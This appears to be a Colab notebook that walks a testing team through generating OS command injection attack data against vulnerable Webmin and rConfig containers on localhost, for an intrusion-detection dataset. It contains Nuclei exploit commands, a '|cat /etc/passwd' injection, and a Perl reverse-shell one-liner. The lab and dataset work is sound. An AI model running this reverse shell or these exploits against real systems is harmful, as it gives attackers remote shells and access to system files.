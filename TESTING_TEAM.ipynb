{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "TESTING TEAM.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyPMIUAKXKF45s/ELMxYnwg5",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/HaleBera/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/blob/main/TESTING_TEAM.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# STEP 1: GAINING ATTACK KNOWLEDGE\n",
        "\n",
        "*   Learn the **logic & methodology** behind the attack type (CWE) and then the each vulnerability (CVE).\n",
        "*   Define each vulnerability's attack subtype (Blind-SQL Injection), if exists.\n",
        "\n"
      ],
      "metadata": {
        "id": "IUzlHwrR49Rb"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# STEP 2: FINDING ATTACK RELATED COMMANDS, PAYLOADS AND CHEAT SHEATS\n",
        "\n",
        "\n",
        "*   First find a cheat sheet for the related attack type (CWE) (also for each CVE,If exists)\n",
        "    **NOTE:** \n",
        "     \n",
        "\n",
        ">*   The \"cheat sheet\" tab in this link can be helpful https://cheatsheetseries.owasp.org/ \n",
        ">*   https://portswigger.net/web-security/all-labs\n",
        "\n",
        "\n",
        "*   From the chest sheet, find the **payloads** and other additional **commands** that an attacker can use to increase the attack's **effectiveness** or it's **maintanence**.\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "EfI6Rwk0AGAF"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# STEP 3: Attack Scenario Generation\n",
        "\n",
        "1- Expand each Nuclei.yaml that contains the payloads and other commands (i.e. reverse shell seession)\n",
        "\n",
        "*or alternatively*\n",
        "\n",
        "2- **Burpsuit (Free)**: Use the \"Intruder\" tool of Burpsuit. Load payloads to intruder, and start attack to the related URL.*\n",
        "\n",
        "**NOTE:** You can convert and check the encoded payloads by using \"URL Decoder/Encoder\" (https://meyerweb.com/eric/tools/dencoder/). Some payloads may be double encoded, so you need to decode them twice.\n",
        "\n"
      ],
      "metadata": {
        "id": "tFwFzHesnC35"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "---\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "jiRPgCi01eLK"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "\n",
        "# EXAMPLE: CWE-78 OS COMMAND INJECTION\n",
        "\n",
        " > STEP 1: GAINING ATTACK KNOWLEDGE\n",
        "\n",
        "\n",
        "> Command injection is an attack in which the** goal is execution of arbitrary commands on the host operating system **via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.\n",
        "\n",
        "> This attack differs from Code Injection, in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. \n",
        "\n",
        "\n",
        "*   URL 1: https://github.com/payloadbox/command-injection-payload-list\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "> Types of Command Injection\n",
        "\n",
        "    > Result based command injection\n",
        "    > Blind command injection\n",
        "        > The time-based technique (Blind)\n",
        "        > The file-based technique (Semi blind)\n",
        "\n",
        "\n",
        "> CVE-2019-15107 : OS Command\n",
        "\n",
        "> CVE-2020-16846 : Blind-OS Command\n",
        "\n",
        "> CVE-2019-16662 : OS Command\n",
        "> \n",
        "*  URL 2: https://crashtest-security.com/command-injection/\n",
        "\n",
        "*  URL 3: https://www.indusface.com/learning/what-is-command-injection/\n",
        "\n",
        "\n",
        "\n",
        "> STEP 2: FINDING ATTACK RELATED COMMANDS, PAYLOADS AND CHEAT SHEETS\n",
        "\n",
        ">  Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\n",
        "\n",
        "> Unix payloads: https://github.com/payloadbox/command-injection-payload-list,\n",
        "\n",
        "> Fuzzing: https://github.com/omurugur/OS_Command_Payload_List/blob/master/OS-Command-Fuzzing.txt\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "> STEP 3: Attack Scenario Generation\n",
        "\n",
        "  > I preparing an extended Nuclei template file, coming soon...\n",
        "\n",
        "  >Till that, you can try the payloads on the Burpsuit and examine the request&reponse reltions."
      ],
      "metadata": {
        "id": "EfhAMjyBKPoA"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "---\n",
        "\n"
      ],
      "metadata": {
        "id": "tI-9iaZsp1Z-"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "# EXAMPLE\n",
        "\n",
        ">**Attack Info**\n",
        "\n",
        ">Weakness Type:   CWE-78 (OS Command Injection) \n",
        "\n",
        ">Vulnerability Name:   Apache Webmin RCE (CVE-2019-15107)\n",
        "\n",
        "\n",
        "(!Currently only the default Nuclei attack and a reverse shell command are available. Other phases will be completed soon...)\n"
      ],
      "metadata": {
        "id": "SDBiB4VdjnzU"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "---\n",
        "\n",
        "**1-** Pull the vulnerable image from the git repo (https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107), and up the application on your localhost's below port:\n"
      ],
      "metadata": {
        "id": "jYl9M5SatG6U"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "$ sudo docker-compose up\n",
        "$ sudo docker run -it -p 10000:10000 -d  vulhub/webmin:1.910"
      ],
      "metadata": {
        "id": "SsEWgvMJkjxg"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "You can check whether the applicaiton runinng properly from your browser with \"https://localhost:10000 \""
      ],
      "metadata": {
        "id": "wbz7jTMAuZNs"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "**2-** Execute the OS command injection attack defined in the \"CVE-2019-15107.yaml\" by using Nuclei Engine:\n"
      ],
      "metadata": {
        "id": "20U5nhvAq6dD"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Nuclei attack command (!https)\n",
        "$ sudo nuclei -u https://localhost:10000 -t ~/nuclei-templates/cves/2019/CVE-2019-15107.yaml -debug"
      ],
      "metadata": {
        "id": "gGuf4VeOuZdt"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**3-** Then to get a reverse shell, we need to perform another execution. For this you can find many alternative ways but, for this tutorial, I prefer to copy the \"CVE-2019-15107.yaml\" and, renamed it as \"CVE-2019-15107_reverse-shell.yaml\". Then, replacing the injection part in that new file with the URL-encoded reverse shell command.\n",
        "\n",
        "The reverse shell command that is used in this tutorial is taken from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet, and after the IP and the port information are customized, it is one-time encoded using an URL Encoder-Decoder https://meyerweb.com/eric/tools/dencoder/:"
      ],
      "metadata": {
        "id": "RsgP6jSDuYhZ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# URL decoded reverse shell command\n",
        "\n",
        "perl -e 'use Socket;$i=\"192.168.XX.XXX\";$p=1453;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"
      ],
      "metadata": {
        "id": "5a5xuLxUzRjt"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**4-** Replace the above URL decoded reverse shell command with the **\"|cat /etc/passwd\"** command in the CVE-2019-15107_reverse-shell.yaml file, and run it with the following command:\n"
      ],
      "metadata": {
        "id": "BrKC7gpt0Kj-"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "$ sudo nuclei -u https://localhost:10000 -t ~/nuclei-templates/cves/2019/CVE-2019-15107_reverse-shell.yaml -debug"
      ],
      "metadata": {
        "id": "RCtvffTy0UDl"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "---\n",
        "\n",
        "CVE-2019-16662: rConfig RCE\n"
      ],
      "metadata": {
        "id": "M73EkER-aEbJ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "$ sudo docker run -d -p 8080:8080 fab1ano/cve-2019-16662:latest\n",
        "\n",
        "# Nuclei attack command\n",
        "$ sudo nuclei -u http://localhost:8080 -t /home/hale/Desktop/TEST_ATTACTKS/ATTACK_YAMLS/CWE-78_OS-Command-Injection/CVE-2019-16662.yaml -debug\n",
        "\n",
        "sudo docker ps #to list the actively running containers\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "l9wAwfkNcEWx"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}